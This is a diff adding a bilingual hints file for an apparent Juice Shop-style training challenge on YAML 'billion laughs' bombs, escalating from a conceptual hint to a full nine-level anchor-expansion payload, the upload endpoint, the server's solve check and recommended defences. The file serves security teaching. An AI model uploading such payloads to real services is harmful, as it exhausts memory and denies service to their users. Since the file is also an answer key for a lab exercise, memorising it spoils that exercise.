@@ -1,0 +1,111 @@
+challenge_key: "yamlBombChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP : "billion laughs YAML". L'attaque classique billion
+      laughs (Aaaaaaa) adapte au format YAML via anchors et references.
+    text_en: |
+      OWASP hint: "billion laughs YAML". Classic billion laughs (Aaaaaaa)
+      attack adapted to YAML format via anchors and references.
+    pedagogical_intent: |
+      Activate YAML bomb reflex.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      Endpoint : /#/complain (Customer Complaint), upload .yml ou .yaml
+      file. YAML supporte les anchors `&name` (definir) et references
+      `*name` (reuser). Une chaine d'anchors qui se references en cascade
+      cree expansion exponentielle.
+    text_en: |
+      Endpoint: /#/complain (Customer Complaint), upload .yml or .yaml
+      file. YAML supports anchors `&name` (define) and references
+      `*name` (reuse). A chain of anchors referencing in cascade creates
+      exponential expansion.
+    pedagogical_intent: |
+      Spell endpoint + mechanism.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      Payload classique YAML bomb :
+      ```yaml
+      a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+      b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
+      c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
+      d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
+      ```
+      Avec 9 niveaux = 10^9 occurrences.
+    text_en: |
+      Classic YAML bomb payload:
+      ```yaml
+      a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+      b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
+      c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
+      d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
+      ```
+      With 9 levels = 10^9 occurrences.
+    pedagogical_intent: |
+      Reveal payload structure.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      Crafter bomb.yml avec 9 niveaux d'anchors. Upload via /#/complain.
+      Le parser js-yaml essaie d'expand les references et timeout
+      (Script execution timed out). Le serveur fileUpload.ts:123-124
+      detecte et solve.
+    text_en: |
+      Craft bomb.yml with 9 anchor levels. Upload via /#/complain. The
+      js-yaml parser tries to expand references and times out (Script
+      execution timed out). Server fileUpload.ts:123-124 detects and
+      solves.
+    pedagogical_intent: |
+      Spell exact action.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Workflow : (1) Crafter bomb.yml :
+      ```yaml
+      a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+      b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
+      c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
+      d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
+      e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
+      f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e, *e]
+      g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f, *f]
+      h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g, *g]
+      i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h, *h]
+      ```
+      (2) /#/complain > attach bomb.yml > Submit. (3) Serveur parse YAML,
+      js-yaml expand 10^9 occurrences, timeout fire. (4) fileUpload.ts:123
+      `if (notSolved(yamlBombChallenge)) solve(yamlBombChallenge)`. (5)
+      Notification "Solved Memory Bomb". Defense : `js-yaml safeLoad` ou
+      `SAFE_SCHEMA`, limite anchor depth, JSON Schema post-parse, file
+      size limit. JAMAIS load() default. Source : fileUpload.ts:123-124.
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Workflow: (1) Craft bomb.yml:
+      ```yaml
+      a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+      b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
+      c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
+      d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
+      e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
+      f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e, *e]
+      g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f, *f]
+      h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g, *g]
+      i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h, *h]
+      ```
+      (2) /#/complain > attach bomb.yml > Submit. (3) Server parses
+      YAML, js-yaml expands 10^9 occurrences, timeout fires. (4)
+      fileUpload.ts:123 `if (notSolved(yamlBombChallenge)) solve
+      (yamlBombChallenge)`. (5) "Solved Memory Bomb" notification.
+      Defense: `js-yaml safeLoad` or `SAFE_SCHEMA`, limit anchor depth,
+      JSON Schema post-parse, file size limit. NEVER default load().
+      Source: fileUpload.ts:123-124.
+    pedagogical_intent: |
+      Solution + canonical fix.
